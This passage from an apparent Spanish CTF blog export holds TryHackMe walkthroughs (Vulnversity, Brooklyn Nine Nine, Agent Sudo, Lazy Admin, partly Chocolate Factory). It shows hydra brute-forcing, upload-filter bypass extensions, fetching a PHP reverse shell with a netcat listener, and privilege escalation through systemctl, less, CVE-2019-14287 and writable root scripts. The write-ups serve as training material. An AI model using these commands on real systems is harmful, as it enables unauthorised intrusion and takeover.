http://10.10.23.174:3333/images/] /css (Status: 301) [Size: 317] [--\u0026gt; http://10.10.23.174:3333/css/] /js (Status: 301) [Size: 316] [--\u0026gt; http://10.10.23.174:3333/js/] /fonts (Status: 301) [Size: 319] [--\u0026gt; http://10.10.23.174:3333/fonts/] /internal (Status: 301) [Size: 322] [--\u0026gt; http://10.10.23.174:3333/internal/] Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: internal\nwfuzz Wfuzz fue creado para facilitar la tarea en las evaluaciones contra aplicaciones web, y está basado en un concepto simple; reemplaza cualquier referencia a la palabra clave FUZZ, por el valor del payload (carga útil) definido.\nUn payload en Wfuzz es una fuente de datos.\nEste concepto simple permite cualquier entrada sea inyectada en cualquier campo de una petición HTTP, permitiendo realizar ataques complejos de seguridad web en diferentes componentes de la aplicación web, como parámetros, formularios, directorios/archivos, cabeceras, etc.\nFuente\nParámetro Función -c Para que lo reporte todo con colores -t Para configurar el tiempo \u0026ndash;hc=404 Para que no reporte los subdirectorios que no existan -w Es donde se indica el diccionario FUZZ Se escribe donde quieres aplicar el diccionario ❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.23.174:3333/FUZZ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000550: 301 9 L 28 W 317 Ch \u0026#34;css\u0026#34; 000000953: 301 9 L 28 W 316 Ch \u0026#34;js\u0026#34; 000002771: 301 9 L 28 W 319 Ch \u0026#34;fonts\u0026#34; 000002984: 301 9 L 28 W 322 Ch \u0026#34;internal\u0026#34; 000095524: 403 11 L 32 W 302 Ch \u0026#34;server-status\u0026#34; Probando desde un navegador los directorios que reporto, el directorio en el que se pueden subir archivos es: internal\nComprometer el servidor web ¿Qué tipo de archivo común, que le gustaría cargar para explotar el servidor, está bloqueado? Prueba un par para averiguarlo. La respuesta es .php\n¿Qué extensión está permitida? Para identificar qué extensiones no están bloqueadas, vamos a fuzzear el formulario de carga. Para hacer esto, vamos a usar BurpSuite.\nPrimero vamos a capturar la petición, enviarlo al intruder y definir la extensión como una variable\nEn el apartado de payloads vamos a definir las extensiones que queremos que pruebe\nAhora ya le podemos dar a attack.\nSi nos fijamos en la columna de length podemos ver que en todas sale lo mismo menos una. Eso significa que con él .phtml no nos ha devuelto el mismo mensaje, se puede suponer que lo ha aceptado\n¿Cuál es el nombre del usuario que administra el servidor web? Viendo que podemos subir .phtml vamos a mandarle un archivo para crear una reverse shell, vamos a usar https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php de pentestmonkey\n# Nos lo pasamos a nuestra máquina wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php # Le cambiamos la extensión mv php-reverse-shell.php php-reverse-shell.phtml Importante cambiar estas líneas\n$ip = \u0026#39;127.0.0.1\u0026#39;; // Ip de tú máquina $port = 1234; // Puerto en el que te vas a poner en escucha Nos ponemos en escucha por el puerto 443 con netcat\nnc -nlvp 443 Ahora ya podemos ejecutar el archivo poniendo lo siguiente en el navegador\nhttp://10.10.23.174:3333/internal/uploads/php-reverse-shell.phtml\nAntes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Ahora en /home/bill/user.txt ya podemos ver la flag y ya sabemos que el nombre de quien administra el servidor web es bill\nEscalada de privilegios En Linux, SUID (establecer el ID de usuario del propietario en la ejecución) es un tipo especial de permiso de archivo otorgado a un archivo. SUID otorga permisos temporales a un usuario para ejecutar el programa/archivo con el permiso del propietario del archivo (en lugar del usuario que lo ejecuta).\nPor ejemplo, el archivo binario para cambiar su contraseña tiene el bit SUID (/usr/bin/passwd). Esto se debe a que para cambiar su contraseña, deberá escribir en el archivo shadowers al que no tiene acceso, root sí, por lo que tiene privilegios de root para realizar los cambios correctos.\nEn el sistema, busque todos los archivos SUID. ¿Qué archivo se destaca? Con find / -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null podemos ver los archivos con permisos suid. La respuesta es /bin/systemctl\nConviértase en root y obtenga la última flag (/root/root.txt) Ejecutando lo siguiente y después haciendo un cat a /tmp/output podemos ver la flag\nTF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;cat /root/root.txt \u0026gt; /tmp/output\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF /bin/systemctl link $TF /bin/systemctl enable --now $TF cat /tmp/output ","date":"2022-12-18","id":134,"permalink":"/writeups/tryhackme/vulnversity/","summary":"Aprende sobre el reconocimiento activo, los ataques a aplicaciones web y la escalada de privilegios.\nhttps://tryhackme.com/room/vulnversity\nIP Atacante = 10.10.10.10","tags":["Walkthroughs","Fácil","Linux"],"title":"Vulnversity"},{"content":"","date":"2022-12-18","id":135,"permalink":"/tags/walkthroughs/","summary":"","tags":[],"title":"Walkthroughs"},{"content":"https://tryhackme.com/room/brooklynninenine\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.243.15\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.243.15 PING 10.10.243.15 (10.10.243.15) 56(84) bytes of data. 64 bytes from 10.10.243.15: icmp_seq=1 ttl=63 time=96.3 ms --- 10.10.243.15 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 96.338/96.338/96.338/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.243.15 -oG allPort Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.100.94 5 │ [*] Open ports: 21,22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p21,22,80 -sC -sV 10.10.243.15 -oN target PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.10.10 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 167fa2ffe0fba98777d6d3eb62572c6a3 (RSA) | 256 2e3b61594bc429ba5e858396f6fe99bee (ECDSA) |_ 256 ab162e79203c9b0a019c8c4426015a804 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.29 (Ubuntu) Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 21 El nmap reporto que nos podemos conectar al puerto 21 como anonymous (ftp-anon: Anonymous FTP login allowed)\nDentro hay un archivo llamado note_to_jake.txt que nos lo podemos pasar a nuestra máquina con get note_to_jake.txt\nContenido note_to_jake.txt Dentro del archivo note_to_jake.txt hay el siguiente mensaje\nFrom Amy,\nJake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine\nDe Amy,\nJake por favor cambia tu contraseña. Es demasiado débil y Holt se enojará si alguien piratea el nueve nueve.\nViendo este mensaje vemos que hay tres usuarios:\nAmy Holt Jake Infiltración Amy dice que la contraseña de Jake es demasiado débil, sabiendo esto podemos intentar con hyra hacer fuerza bruta al ssh como jake.\nHydra se considera el software para ciberseguridad estándar para ejecutar ataques de fuerza bruta en cuentas de servicios.\n❯ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.92.221 ssh -t 40 [22][ssh] host: 10.10.84.47 login: jake password: --------- Ahora ya nos podemos conectar por ssh como jake\nssh jake@10.10.84.47 Tratamiento de tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm user.txt En el directorio /home/jake y /home/amy no hay nada, pero en el /home/holt está el user.txt\nEscalada de privilegios ❯ sudo -l User jake may run the following commands on brookly_nine_nine: (ALL) NOPASSWD: /usr/bin/less ¿Qué es less? Less es un programa similar a more, pero que permite retroceder movimiento en el archivo, asi como el movimiento hacia adelante. además, menos no tiene que leer todo el archivo de entrada antes de comenzar, por lo que con archivos de entrada grandes, se inicia más rápido que los editores de texto como vi\n¿Como escalar con less? Si el binario puede ejecutarse como superusuario sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.\nLo primero es ejecutar less con sudo y especificarle un archivo que queremos leer, por ejemplo user.txt\nsudo less user.txt Después si escribimos !/bin/bash y le damos a enter, ya somos root\nroot@brookly_nine_nine:/home/holt# whoami root ","date":"2022-12-17","id":136,"permalink":"/writeups/tryhackme/brooklyn-nine-nine/","summary":"https://tryhackme.com/room/brooklynninenine\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.243.15\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","Fuerza bruta","less"],"title":"Brooklyn Nine Nine"},{"content":"","date":"2022-12-17","id":137,"permalink":"/tags/less/","summary":"","tags":[],"title":"less"},{"content":"Bienvenido a otra sala CTF exclusiva de THM. Tu tarea es simple, captura las banderas. ¡Que te diviertas!\nhttps://tryhackme.com/room/agentsudoctf\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.92.221\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.92.221 PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data. 64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms --- 10.10.92.221 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 127.854/127.854/127.854/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.92.221 -oG allPort Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.92.221 5 │ [*] Open ports: 21,22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p21,22,80 -sC -sV 10.10.92.221 -oN target PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef1f5d04d4779506d6072ecf058f2cc07 (RSA) | 256 5e02d19ac4e7430662c19e25848aed7ea (ECDSA) |_ 256 2d005cdb9fda8c8d880e3924f8b4f18e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Annoucement |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Parámetro Función -p21,22,80 Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 80 Hay una web con el siguiente texto en la página principal:\nDear agents,\nUse your own codename as user-agent to access the site.\nFrom, Agent R\nEstimados agentes,\nUtilice su propio nombre en clave como agente de usuario para acceder al sitio.\nDe, Agente R\nSegún el texto podemos usar el \u0026ldquo;nombre en clave\u0026rdquo; como \u0026ldquo;user agent\u0026rdquo;. Vemos que está firmado como Agente R, se puede suponer que los agentes tienen una letra como nombre en clave. Con curl -A \u0026quot;A\u0026quot; 10.10.92.221 podemos ver la web como Agente A, pero ir probando así hasta la z se puede hacer eterno, para eso e echo un script en python que atomatiza el proceso de las peticiones y guarda las repuestas distintas.\nUser-Agent o también conocido como Agente de Usuario es una cabecera de texto que sirve para identificar al usuario que entra en una página web a través del navegador.\nfrom pwn import * import requests, signal, time, pbd, sys, string, os main_url = \u0026#34;http://10.10.92.221\u0026#34; characters = string.ascii_uppercase standard = requests.get(main_url) different = \u0026#34;\u0026#34; p1 = log.progress(\u0026#34;Trying with Agent\u0026#34;) p2 = log.progress(\u0026#34;Agents with different response\u0026#34;) for i in characters: headers = { \u0026#39;User-Agent\u0026#39;: i } response = requests.get(main_url, headers=headers) p1.status(i) if response.text != standard.text: different += \u0026#34; {},\u0026#34;.format(i) p2.status(different) f = open (\u0026#39;agent_{}.txt\u0026#39;.format(i) ,\u0026#39;w\u0026#39;) f.write(response.text) print(\u0026#34;\\n[*] Result saved on agent_{}.txt\u0026#34;.format(i)) f.close() Al ejecutarlo encuentra respuestas distintas con el Agente C y el Agente R\n❯ python3 script.py [*] Trying with Agent: Z [*] Agents with different response: C, R, [*] Result saved on agent_C.txt [*] Result saved on agent_R.txt Dentro del agente_C.txt hay el siguiente mensaje\nDo you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!\n¿Todavía recuerdas nuestro trato? Por favor, dígale al agente J sobre las cosas lo antes posible. Además, cambia tu maldita contraseña, ¡es débil!\nComo dice que su contraseña es débil con hydra vamos a intentar encontrarla usando un diccionario.\nHydra se considera el software para ciberseguridad estándar para ejecutar ataques de fuerza bruta en cuentas de servicios.\nhydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.92.221 -t 40 Parámetro Función -l Usuario -P Diccionario -t Velocidad Infiltración Puerto 21 El hydra encuentra la contraseña y ya podemos conectarnos por ftp como chris, dentro hay 3 archivos: To_agentJ.txt, cute-alien.jpg y cutie.png. Con get archivo nos los podemos pasar a nuestra máquina.\nContenido de To_agentJ.txt\nDear agent J,\nAll these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn\u0026rsquo;t be a problem for you.\nFrom, Agent C\nEstimado agente J,\n¡Todas estas fotos alienígenas son falsas! El Agente R almacenó la imagen real dentro de su directorio. Su contraseña de inicio de sesión se almacena de alguna manera en la imagen falsa. No debería ser un problema para ti.\nDe, Agente C\ncute-alien.jpg El Agente C dice que dentro de esta foto hay la contraseña de inicio de session del Agente J. Con steghide podemos intentar ver su contenido\n❯ steghide extract -sf cute-alien.jpg Anotar salvoconducto: steghide: �no pude extraer ning�n dato con ese salvoconducto! No encuentra nada sin indicar salvoconducto. Para ello vamos a usar esta herramienta: https://github.com/RickdeJager/stegseek para atraves de un diccionario poder conseguir el contenido oculto de la foto.\n❯ stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt StegSeek 0.6 - https://github.com/RickdeJager/StegSeek [i] Found passphrase: \u0026#34;Area51\u0026#34; [i] Original filename: \u0026#34;message.txt\u0026#34;. [i] Extracting to \u0026#34;cute-alien.jpg.out\u0026#34;. message.txt Contenido del archivo message.txt renombrado a cute-alien.jpg.out\nHi james,\nGlad you find this message. Your login password is censored!\nDon\u0026rsquo;t ask me why the password look cheesy, ask agent R who set this password for you.\nYour buddy, chris\nHola James,\nMe alegro de que encuentres este mensaje. ¡Su contraseña de inicio de sesión es censurado!\nNo me pregunte por qué la contraseña parece cursi, pregúntele al agente R quién estableció esta contraseña para usted.\nTu amigo, cris\nPuerto 22 Ahora ya tenemos las credenciales de james y nos podemos conectar por ssh\nYa podemos ver la flag de user.txt\nEscalada de privilegios con sudo -l podemos ver que puede ejecutar como root\njames@agent-sudo:~$ sudo -l User james may run the following commands on agent-sudo: (ALL, !root) /bin/bash E buscado el (ALL, !root) /bin/bash en google y e encontrado que esto es porque el sudo tiene una versión menor a la 1.8.27 lo que lo hace vulnerable. Se puede confirmar con:\njames@agent-sudo:~$ sudo --version Sudo version 1.8.21p2 En el exploit (https://www.exploit-db.com/exploits/47502) lo que pone es que podemos ejecutar cosas con sudo de la siguiente forma:\nsudo -u#-1 /bin/bash\nDe echo ejecutando eso ya somos root y podemos ver la flag en el /root/root.txt\n","date":"2022-12-15","id":138,"permalink":"/writeups/tryhackme/agent-sudo/","summary":"Bienvenido a otra sala CTF exclusiva de THM. Tu tarea es simple, captura las banderas. ¡Que te diviertas!\nhttps://tryhackme.com/room/agentsudoctf\nIP Atacante = 10.","tags":["CTF","Fácil","Linux","Fuerza bruta","CVE-2019-14287","Archivos ocultos"],"title":"Agent sudo"},{"content":"","date":"2022-12-15","id":139,"permalink":"/tags/archivos-ocultos/","summary":"","tags":[],"title":"Archivos ocultos"},{"content":"","date":"2022-12-15","id":140,"permalink":"/tags/cve-2019-14287/","summary":"","tags":[],"title":"CVE-2019-14287"},{"content":"","date":"2022-12-14","id":141,"permalink":"/tags/hash-md5/","summary":"","tags":[],"title":"hash md5"},{"content":"Máquina fácil Linux para practicar tus habilidades.\nhttps://tryhackme.com/room/lazyadmin\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.192.128\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.192.128 PING 10.10.192.128 (10.10.192.128) 56(84) bytes of data. 64 bytes from 10.10.192.128: icmp_seq=1 ttl=63 time=66.1 ms --- 10.10.192.128 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 66.057/66.057/66.057/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.192.128 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPorts Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.29.188 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ sudo nmap -p22,80 -sC -sV 10.10.192.128 -Pn target PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 497cf741104373da2ce63s89586f8e0f0 (RSA) | 256 2fd7c44ce81b5sa9044dfc0638c72ae55 (ECDSA) |_ 256 6184622s7c6c32917dd27459e29cb905e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Parámetro Función -p22,80 Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 80 Al entrar a la web lo primero que se ve es lo siguiente\nBuscando subdirectorios Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que está en /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt con el siguiente comando:\nwfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.192.128/FUZZ ======================================================================= ID Response Lines Word Chars Payload ======================================================================= 000000075: 301 9 L 28 W 316 Ch \u0026#34;content\u0026#34; 000095524: 403 9 L 28 W 278 Ch \u0026#34;server-status\u0026#34; Parámetro Función -c Para que lo reporte todo con colores -t Para configurar el tiempo \u0026ndash;hc=404 Para que no nos reporte los subdirectorios que no existan -w Es donde se indica el diccionario FUZZ Se escribe donde quieres aplicar el diccionario Dentro de /content solo hay un texto\nTraducción: Bienvenido a SweetRice - Gracias por instalar SweetRice como su sistema de administración de sitios web. Este sitio se está construyendo ahora, por favor llegue tarde. Si usted es el webmaster, vaya a Dashboard -\u0026gt; General -\u0026gt; Configuración del sitio web y desmarque la casilla de verificación \u0026ldquo;Cerrar sitio\u0026rdquo; para abrir su sitio web. Más ayuda en Consejo para Basic CMS SweetRice instalado\nBuscando subdirectorios en /content/ ❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.192.128/content/FUZZ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000016: 301 9 L 28 W 323 Ch \u0026#34;images\u0026#34; 000000953: 301 9 L 28 W 319 Ch \u0026#34;js\u0026#34; 000002190: 301 9 L 28 W 320 Ch \u0026#34;inc\u0026#34; 000003320: 301 9 L 28 W 319 Ch \u0026#34;as\u0026#34; 000003601: 301 9 L 28 W 324 Ch \u0026#34;_themes\u0026#34; 000003808: 301 9 L 28 W 327 Ch \u0026#34;attachment\u0026#34; Credenciales Inicio Session Dentro del /inc hay una carpeta llamada mysql_backup/ dentro hay un archivo llamado mysql_bakup_20191129023059-1.5.1.sql nos lo descargamos, dentro se puede ver un usuario llamado manager con un hash --------------\n❯ hash-identifier -------------- Possible Hashs: [+] MD5 Para ver el contenido vamos a usar John the Ripper\nJohn The Ripper es una herramienta de código abierto para la recuperación y auditoría de seguridad en contraseñas, además de ser multiplataforma, es el más utilizado y versátil, ya que combina una velocidad de “craqueo” rápida, con una extraordinaria gama de tipos de hash compatibles.\n❯ sudo john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3]) Warning: no OpenMP support for this hash type, consider --fork=8 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Password Censurada (?) 1g 0:00:00:00 DONE (2022-12-14 21:28) 100.0g/s 3379Kp/s 3379Kc/s 3379KC/s 062089..redlips Session completed. Ahora ya podemos iniciar sessión en el panel de login que está en /content/as\nCon esto entramos a un directorio que parece ser el panel de control del administrador, hay muchos apartados, pero hay uno (media center) En el cual podemos subir archivos.\nReverse shell Vamos a intentar subir un archivo.php malicioso echo por pentestmonkey para crear una reverse shell\nwget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php Importante cambiar esto con la ip de nuestra máquina y el puerto en el que vamos a estar en escucha\n$ip = \u0026#39;10.10.10.10\u0026#39;; // CHANGE THIS $port = 443; // CHANGE THIS Ahora ya lo podemos subir\nNo se ha subido, puede ser que al ser .php lo haya bloqueado\u0026hellip; En estas situaciones, se puede intentar con extensiones menos típicas de php que el admin no haya bloqueado.\nEjemplos de alternativas a .php: .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module\nPrimero vamos a probar con .phtml\n¡Ahora si!\nNos ponemos en escucha por el puerto 443\nnc -nlvp 443 Clicamos el archivo que hemos subido anteriormente a la web y recibimos la conexión\nTratamiento de la tty Antes de empezar lo primero para trabajar mejor es hacer un tratamiento de la tty\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Escalada de privilegios Con sudo -l se puede ver que podemos ejecutar /usr/bin/perl y /home/itguy/backup.pl\nSi vamos al /home/itguy/, y hacemos un cat a backup.pl se ve que ejecuta un archivo que está en /etc/copy.sh\n(Contenido backup.pl)\n#!/usr/bin/perl system(\u0026#34;sh\u0026#34;, \u0026#34;/etc/copy.sh\u0026#34;); En este archivo no tenemos permisos de escritura, pero en el copy.sh sí. Vamos a hacer una prueba para ver si lo que ponemos en copy.sh se ejecuta como root\nwww-data@THM-Chal:/$ echo \u0026#34;whoami\u0026#34; \u0026gt; /etc/copy.sh www-data@THM-Chal:/$ sudo perl /home/itguy/backup.pl root Efectivamente se ejecuta como root, ahora vamos a decirle al copy.sh que spawnee una bash\nwww-data@THM-Chal:/$ echo \u0026#34;/bin/bash -i\u0026#34; \u0026gt; /etc/copy.sh www-data@THM-Chal:/$ sudo perl /home/itguy/backup.pl root@THM-Chal:/# ¡Ya somos root!\nCon un cat /root/root.txt podemos ver la flag\n","date":"2022-12-14","id":142,"permalink":"/writeups/tryhackme/lazy-admin/","summary":"Máquina fácil Linux para practicar tus habilidades.\nhttps://tryhackme.com/room/lazyadmin\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.192.128\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","Archivos ocultos","hash md5","file upload"],"title":"Lazy admin"},{"content":"Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.\nhttps://tryhackme.com/room/chocolatefactory\nPara empezar lo primero es comprobar si la máquina está activa y que OS tiene\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.250.47\n❯ ping -c 1 10.10.250.47 PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data. 64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms --- 10.10.250.47 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.300/52.300/52.300/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.250.47 -oG allPort PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 63 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 100/tcp open newacct syn-ack ttl 63 101/tcp open hostname syn-ack ttl 63 102/tcp open iso-tsap syn-ack ttl 63 103/tcp open gppitnp syn-ack ttl 63 104/tcp open acr-nema syn-ack ttl 63 105/tcp open csnet-ns syn-ack ttl 63 106/tcp open pop3pw syn-ack ttl 63 107/tcp open rtelnet syn-ack ttl 63 108/tcp open snagas syn-ack ttl 63 109/tcp open pop2 syn-ack ttl 63 110/tcp open pop3 syn-ack ttl 63 111/tcp open rpcbind syn-ack ttl 63 112/tcp open mcidas syn-ack ttl 63 113/tcp open ident syn-ack ttl 63 114/tcp open audionews syn-ack ttl 63 115/tcp open sftp syn-ack ttl 63 116/tcp open ansanotify syn-ack ttl 63 117/tcp open uucp-path syn-ack ttl 63 118/tcp open sqlserv syn-ack ttl 63 119/tcp open nntp syn-ack ttl 63 120/tcp open cfdptkt syn-ack ttl 63 121/tcp open erpc syn-ack ttl 63 122/tcp open smakynet syn-ack ttl 63 123/tcp open ntp syn-ack ttl 63 124/tcp open ansatrader syn-ack ttl 63 125/tcp open locus-map syn-ack ttl 63 Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n───────┬────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.250.47 5 │ [*] Open ports: 21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112, │ 